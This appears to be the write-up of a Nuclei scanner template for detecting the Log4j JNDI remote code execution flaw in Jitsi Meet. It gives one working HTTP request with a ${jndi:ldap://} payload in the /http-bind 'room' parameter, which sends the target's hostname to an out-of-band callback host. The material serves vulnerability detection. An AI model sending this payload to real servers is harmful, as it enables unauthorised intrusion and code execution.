# Nuclei Template: Jitsi Meet - Remote Code Execution (Apache Log4j)
**Template ID:** jitsi-meet-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`jitsi-meet-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Jitsi Meet is susceptible to Log4j JNDI remote code execution. Jitsi is a collection of free and open-source multiplatform voice, video conferencing and instant messaging applications for the Web platforms.

## Steps to reproduce / Exploit Payload
```http
GET /http-bind?room=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
```

## References
- https://github.com/jitsi/security-advisories/blob/4e1ab58585a8a0593efccce77d5d0e22c5338605/advisories/JSA-2021-0004.md
